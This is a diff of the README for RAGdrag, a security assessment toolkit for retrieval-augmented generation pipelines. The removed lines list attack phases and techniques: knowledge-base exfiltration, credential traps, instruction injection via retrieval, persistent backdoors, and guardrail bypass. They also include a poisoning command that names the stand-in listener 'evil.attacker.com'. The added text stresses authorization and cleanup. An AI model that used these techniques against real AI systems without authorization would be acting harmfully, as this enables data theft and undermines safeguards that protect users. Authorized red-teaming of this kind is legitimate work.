@@ -3,193 +3,200 @@
 <p align="center">
 <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python 3.10+"></a>
 <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License: MIT"></a>
-<a href="#"><img src="https://img.shields.io/badge/version-0.5.0-orange.svg" alt="Version"></a>
+<img src="https://img.shields.io/badge/version-0.6.0-orange.svg" alt="Version 0.6.0">
 </p>
 
-<p align="center">
-RAG pipeline security assessment toolkit
-</p>
+RAG pipeline security assessment toolkit for authorized testing.
 
----
-
-## What is RAGdrag?
-
-RAGdrag is a structured methodology and toolkit for testing Retrieval Augmented Generation (RAG) pipeline security. It treats the RAG pipeline as a distinct assessment surface, not just another LLM to prompt inject, but an information retrieval system with its own recon surface, data exposure paths, poisoning vectors, and evasion gaps. 27 techniques across 6 kill chain phases, mapped to [MITRE ATLAS](https://atlas.mitre.org/).
+RAGdrag assesses retrieval, generation, and ingestion boundaries through six
+phases. The executable engine registry currently exposes 20 technique IDs. The
+27-entry taxonomy also contains catalogued ideas without executable phase
+claims. See the generated [implementation status](docs/implementation-status.md)
+for capability IDs, technique IDs, impact, and maturity.
 
 ## Installation
 
 ```bash
 git clone https://github.com/McKern3l/RAGdrag.git
-cd ragdrag
-pip install -e .
+cd RAGdrag
+python -m pip install -e .
+ragdrag --version
 ```
 
-Requires Python 3.10+.
+Requires Python 3.10 or later. CI gates Python 3.10, 3.11, and 3.12.
 
-## Quick Start
+## Quick start
 
-Point ragdrag at any RAG-enabled endpoint:
+Use an endpoint you own or are explicitly authorized to assess. These examples
+use a local lab. Default `scan` selects R1,R2,R3 at an `active-non-mutating`
+impact ceiling. It sends requests and can expose sensitive responses; R4/R5
+ingestion writes require explicit authorization. R6 is opt-in.
 
 ```bash
-# Fingerprint: is it RAG? What vector DB?
-ragdrag fingerprint -t https://your-target.com/api/chat
-
-# Probe: map chunk boundaries, retrieval thresholds, KB scope
-ragdrag probe -t https://your-target.com/api/chat --depth full
-
-# Exfiltrate: what's in the knowledge base?
-ragdrag exfiltrate -t https://your-target.com/api/chat --deep
-
-# Poison: inject documents, plant credential traps
-ragdrag poison -t https://your-target.com/api/chat --listener evil.attacker.com
-
-# Hijack: redirect retrieval, saturate context, trigger tool calls
-ragdrag hijack -t https://your-target.com/api/chat --callback https://your-listener.com
-
-# Evade: test guardrail bypass techniques
-ragdrag evade -t https://your-target.com/api/chat
-
-# Full kill chain (all 6 phases)
-ragdrag scan -t https://your-target.com/api/chat
-
-# Capture leaked credentials from URL fetcher exploitation
-ragdrag listen --port 8443
-
-# Save findings to file
-ragdrag fingerprint -t https://your-target.com/api/chat -o findings.json
+ragdrag scan --target http://127.0.0.1:8899/chat --output report.json
 ```
 
-No setup beyond `pip install`. Point it at a target and go.
-
-### Test Lab (Optional)
-
-A vulnerable RAG test target and exercises are available in a separate repo for anyone who wants to validate the tool or follow along with the walkthrough:
-
-**[McKern3l/RAGdrag-labs](https://github.com/McKern3l/RAGdrag-labs)** — intentionally vulnerable lab servers and test suite
-
-The lab servers require [Ollama](https://ollama.com/) with any model pulled. Default is `llama3.2`, configurable via environment variable:
+Explicitly include R6 when the scope includes evasion assessment:
 
 ```bash
-# Pull the default model
-ollama pull llama3.2
-
-# Start the open (no guardrails) lab server
-cd ragdrag-labs
-pip install -e .
-python targets/rag_server.py
-
-# Use a different model
-OLLAMA_MODEL=mistral python targets/rag_server.py
-
-# Then run RAGdrag against it
-ragdrag scan -t http://localhost:8899/chat
+ragdrag scan --target http://127.0.0.1:8899/chat --phases R1,R2,R3,R6 \
+  --history-field messages --response-field response --output report.json
 ```
 
-See the [RAGdrag-labs README](https://github.com/McKern3l/RAGdrag-labs) for all configuration options.
+Existing command names and options remain compatible. The default scan and
+write requirements changed in 0.6.0; scripts may need to select phases and
+establish cleanup controls explicitly.
 
-## Commands
+## Write authorization and cleanup
 
-| Command | Description |
-|---------|-------------|
-| `fingerprint` | R1: Detect RAG presence and identify vector database technology |
-| `probe` | R2: Map pipeline internals (chunk sizing, thresholds, KB scope) |
-| `exfiltrate` | R3: Extract knowledge base contents and credentials |
-| `poison` | R4: Inject attacker-controlled content into the knowledge base |
-| `hijack` | R5: Take control of RAG pipeline retrieval and generation |
-| `evade` | R6: Test evasion techniques against guardrails and monitoring |
-| `scan` | Run multiple kill chain phases against a target |
-| `listen` | Start a credential capture HTTP listener for RD-0304/RD-0403 |
-| `report` | Generate JSON reports from findings |
+R4/R5 require a cleanup DELETE URL with exactly one final `/{id}` path segment,
+no query, fragment, or userinfo, and an approved origin. For `scan`, also use
+`--allow-write`. Standalone `poison` and `hijack` express write intent themselves
+and still require cleanup and all three controls.
 
-## The RAGdrag Kill Chain
+Establish a baseline, a negative control, and cleanup verification in your lab
+before asserting them with `--established-control`. These flags declare existing
+operational controls; they do not perform or prove those controls.
 
-```
-    R1              R2             R3              R4             R5             R6
- FINGERPRINT --> PROBE -------> EXFILTRATE --> POISON -------> HIJACK -------> EVADE
-
- Detect RAG     Map internals  Extract KB      Inject docs    Redirect       Bypass
- Identify DB    Chunk sizing   Harvest creds   Dominate       retrieval      guardrails
- Find model     Threshold map  Bypass filters  retrieval      Override       Avoid
- Scope target   Scope KB                       Plant traps    instructions   detection
+```bash
+ragdrag scan --target http://127.0.0.1:8899/chat --phases R4,R5 --allow-write \
+  --cleanup-url 'http://127.0.0.1:8899/documents/{id}' \
+  --established-control baseline \
+  --established-control negative-control \
+  --established-control cleanup-verification --output write-report.json
 ```
 
-Each phase builds on the previous. R1 tells you what you're testing. R2 tells you how it works internally. R3 pulls data out. R4 puts data in. R5 takes control. R6 validates evasion gaps.
+The mutation ledger tracks write attempts and runs registered cleanup on normal,
+failed, and interrupted execution. Unknown creation outcomes and failed cleanup
+remain unresolved. Inspect mutation records and verify target state after the
+run. The current DELETE handler records HTTP 200, 202, 204, or 404 as `removed`;
+**202 establishes acceptance, not eventual absence**. Generic POST ingestion may
+upsert an existing object: safety is not proven without a create-only contract
+or restore semantics. A deletion route alone does not establish that contract.
 
-Not every assessment uses all six phases. A quick exfil test might be R1 > R3 > R6. A persistence validation is R1 > R2 > R4 > R6. The kill chain is a menu, not a checklist.
+## Credentials and conversation state
 
-## Technique Reference
+`--header` / `-H` and `--cookie` are scoped to the exact target origin: scheme,
+hostname, and effective port. Alternate ports and cross-origin redirects do not
+inherit credentials. An independently approved ingestion origin receives only
+its own configured headers. `poison` and `hijack` accept `--ingest-url` and
+`--api-key`; that key is scoped to the ingestion origin and does not migrate to
+the chat origin on redirects. TLS verification is enabled by default;
+`--no-verify-ssl` explicitly disables it.
 
-| ID | Name | Phase | ATLAS Tactic |
-|----|------|-------|--------------|
-| RD-0101 | RAG Presence Detection | R1 Fingerprint | Reconnaissance |
-| RD-0102 | Vector Database Fingerprinting | R1 Fingerprint | Reconnaissance |
-| RD-0103 | Embedding Model Identification | R1 Fingerprint | Reconnaissance |
-| RD-0104 | Ingestion Pipeline Mapping | R1 Fingerprint | Reconnaissance |
-| RD-0105 | Document Loader Exploitation | R1 Fingerprint | Reconnaissance |
-| RD-0201 | Chunk Boundary Detection | R2 Probe | Reconnaissance / ML Model Access |
-| RD-0202 | Context Window Sizing | R2 Probe | Reconnaissance / ML Model Access |
-| RD-0203 | Retrieval Threshold Mapping | R2 Probe | Reconnaissance / ML Model Access |
-| RD-0204 | Knowledge Base Scope Enumeration | R2 Probe | Reconnaissance / ML Model Access |
-| RD-0205 | RAG Jamming (Denial of Service) | R2 Probe | Reconnaissance / ML Model Access |
-| RD-0301 | Direct Knowledge Extraction | R3 Exfiltrate | Exfiltration |
-| RD-0302 | Guardrail-Aware Extraction | R3 Exfiltrate | Exfiltration |
-| RD-0303 | Cross-Reference Exfiltration | R3 Exfiltrate | Exfiltration |
-| RD-0304 | URL Fetcher Exploitation | R3 Exfiltrate | Exfiltration |
-| RD-0305 | Embedding Inversion | R3 Exfiltrate | Exfiltration |
-| RD-0401 | Document Injection | R4 Poison | Persistence / Impact |
-| RD-0402 | Embedding Dominance | R4 Poison | Persistence / Impact |
-| RD-0403 | Credential Trap | R4 Poison | Persistence / Impact |
-| RD-0404 | Instruction Injection via Retrieval | R4 Poison | Persistence / Impact |
-| RD-0501 | Retrieval Redirection | R5 Hijack | Execution / Impact |
-| RD-0502 | Context Window Saturation | R5 Hijack | Execution / Impact |
-| RD-0503 | Agent Tool Manipulation | R5 Hijack | Execution / Impact |
-| RD-0504 | Persistent Backdoor via RAG | R5 Hijack | Execution / Impact |
-| RD-0601 | Semantic Substitution | R6 Evade | Defense Evasion |
-| RD-0602 | Retrieval Camouflage | R6 Evade | Defense Evasion |
-| RD-0603 | Query Pattern Obfuscation | R6 Evade | Defense Evasion |
-| RD-0604 | Multi-Turn Context Building | R6 Evade | Defense Evasion |
+Network commands share `--query-field` (default `query`), `--response-field`,
+`--history-field`, `--session-field`, and `--session-id`. A configured response
+field must contain a JSON string; malformed or missing data produces an
+`unsupported-response` outcome. Without a response field, response text is used.
 
-## Payload Templates
+Use `--history-field messages` for a target that accepts conversation messages,
+or `--session-field session_id --session-id lab-session` for an explicit session.
+The adapter also tracks usable cookies established by the target. Multi-turn
+assessment requires history, an explicit session, or an established usable
+cookie; without real state it reports `capability-not-applicable`.
 
-Pre-built query templates in `ragdrag/payloads/queries/`:
+## Reports and exit codes
 
-| Template | Queries | Target |
-|----------|---------|--------|
-| `enterprise-chatbot.json` | 14 | Corporate RAG bots (credentials, infra, PII, internal docs) |
-| `customer-support.json` | 12 | Support bots (agent tools, backend APIs, customer data) |
-| `knowledge-base.json` | 12 | Any document-backed RAG (inventory, sensitive content, architecture) |
-| `guardrail-bypass.json` | 14 | Semantic substitution variants (word subs, encoding, reframing) |
-| `fingerprint_*.json` | 3 files | R1 fingerprinting probes (RAG presence, vector DB, embedding model) |
+Reports use schema version **1.0**, shipped at
+[`ragdrag/reporters/schemas/report-v1.schema.json`](ragdrag/reporters/schemas/report-v1.schema.json).
+They include target configuration, run status, capabilities, findings, evidence,
+mutations, implementation status, and summary counts. Finding evidence states
+are `observed`, `inferred`, and `validated`; these describe evidence, separately
+from capability maturity. A heuristic finding alone does not prove a
+vulnerability. Assess authentication failures, unsupported responses, and
+indeterminate execution alongside findings.
 
-## Links
+Default reports withhold raw extraction text and redact credentials and untrusted
+free text. Validate a saved schema 1.0 report with the established command:
 
-- **RAGdrag Labs:** [github.com/McKern3l/RAGdrag-labs](https://github.com/McKern3l/RAGdrag-labs) (test target, sample results)
-- **Blog:** [github.com/McKern3l](https://github.com/McKern3l)
-- **MITRE ATLAS:** [atlas.mitre.org](https://atlas.mitre.org/)
-- **OWASP LLM Top 10 2025:** [LLM08: Vector and Embedding Weaknesses](https://genai.owasp.org/)
+```bash
+ragdrag report --input report.json --format json
+```
 
-## Contributing
+| Code | Meaning |
+|---|---|
+| 0 | Completed cleanly, no findings |
+| 1 | Completed with findings |
+| 2 | Partial, blocked, interrupted, or indeterminate assessment |
+| 3 | Invalid configuration or target |
+| 4 | Execution failure |
+| 5 | Unresolved cleanup; takes precedence over findings and other failures |
 
-Contributions welcome. Open an issue or PR. If you've validated RAGdrag techniques against authorized targets and have findings to share, we especially want to hear from you.
+A blocked or unreachable target is not a clean assessment. Preserve reports on
+nonzero exits; they can contain partial evidence and cleanup state.
 
-Please keep queries realistic and practically useful. Every technique in this project was validated through hands-on security testing, not theoretical analysis.
+## Listener
 
-## Disclaimer
+The listener binds to `127.0.0.1` by default. Capture output is JSON Lines;
+credentials and raw request content are withheld by default and untrusted
+terminal text is escaped. Capture files use owner-only mode `0600` and reject
+unsafe aliases. Raw request storage is a sensitive opt-in:
 
-**RAGdrag is intended for authorized security testing and research only.**
+```bash
+ragdrag listen --port 8443 --output captures.jsonl
+ragdrag listen --port 8443 --store-raw --output private-captures.jsonl
+```
 
-All techniques were developed and validated in authorized lab environments. Use of this tool against systems without explicit authorization is illegal and unethical. The authors are not responsible for misuse.
+Protect raw captures and follow your engagement retention policy. Non-loopback
+binding requires `--allow-public`; `--tls` enables the existing self-signed TLS
+mode. `--max-body-bytes` defaults to 1,048,576 and accepts 1–1,048,576;
+`--max-concurrency` defaults to 4 and accepts 1–64. Unsupported framing and
+oversized declared bodies are rejected, and saturated workers return 503. These
+bounds do not establish absolute connection lifetime, slow header/body progress
+deadlines, TLS handshake deadlines, or daemon-worker completion on shutdown.
+Use infrastructure appropriate to your scope when those guarantees are needed.
 
-Responsible disclosure: vulnerabilities discovered using these techniques should be reported through appropriate channels.
+## Commands and capability claims
 
-## License
+| Command | Behavior |
+|---|---|
+| `fingerprint` | R1: RAG presence and vector database assessment; `--no-port-scan` available |
+| `probe` | R2: Retrieval and knowledge scope assessment; `--depth quick` or `full` |
+| `exfiltrate` | R3: Knowledge exposure assessment; `--deep` available |
+| `poison` | R4: Ingestion assessment with explicit cleanup controls |
+| `hijack` | R5: Retrieval/generation assessment with explicit cleanup controls |
+| `evade` | R6: Evasion assessment, including real conversation state |
+| `scan` | Selected phases; defaults to R1,R2,R3 |
+| `listen` | Local capture listener with protected raw-storage opt-in |
+| `report` | Validate and display a schema 1.0 JSON report |
 
-MIT - See [LICENSE](LICENSE) for details.
+Use `ragdrag COMMAND --help` for the complete option contract. R2 executable
+names are chunk boundary detection (RD-0201), similarity threshold mapping
+(RD-0202), retrieval count estimation (RD-0203), knowledge base scope mapping
+(RD-0204), and embedding model fingerprinting (RD-0205). Historical taxonomy
+names differ; executable metadata and source define current behavior.
 
-## Author
+Catalogued entries without independent executable registry claims are RD-0103,
+RD-0104, RD-0105, RD-0303, RD-0304, RD-0305, and RD-0602. Camouflage helpers may be
+used by other phases, but RD-0602 is not an R6 registry technique in this release.
 
-**McKern3l** / [github.com/McKern3l](https://github.com/McKern3l) / [git.zero-lab.ai](https://git.zero-lab.ai/zero-lab-ai/ragdrag)
+Maturity labels mean: `catalogued` describes an idea; `implemented` describes
+executable registry behavior; `validated` requires a declared test file present
+in the checkout; `experimental` retains the registry's qualification. The
+generated table does not certify target-specific findings or prove that tests
+ran. CI runs the suite and checks the artifact for drift.
 
----
+## Development and release checks
 
-*"The RAG pipeline is not just another LLM to prompt inject. It's an information retrieval system with its own security surface. Treat it like one."*
+```bash
+python -m pip install -e '.[dev]'
+pytest -q
+python -m ragdrag.engine.status --check docs/implementation-status.md
+python -m build
+```
+
+After changing executable metadata, regenerate with
+`python -m ragdrag.engine.status --write docs/implementation-status.md` from the
+checkout root. Validation paths are checkout-relative: installed packages
+without the test suite fall back to `implemented`. CI checks and regenerates the
+artifact, builds wheel and source distribution, and smoke-tests a fresh wheel
+installation on Python 3.10, 3.11, and 3.12.
+
+## Lab, contributions, and license
+
+The optional [RAGdrag labs](https://github.com/McKern3l/RAGdrag-labs) provide local
+targets and exercises. Contributions should describe reproducible behavior,
+validation evidence, and limits. Use RAGdrag only within explicit authorization
+and disclose findings through appropriate channels.
+
+MIT — see [LICENSE](LICENSE). Author: [McKern3l](https://github.com/McKern3l).
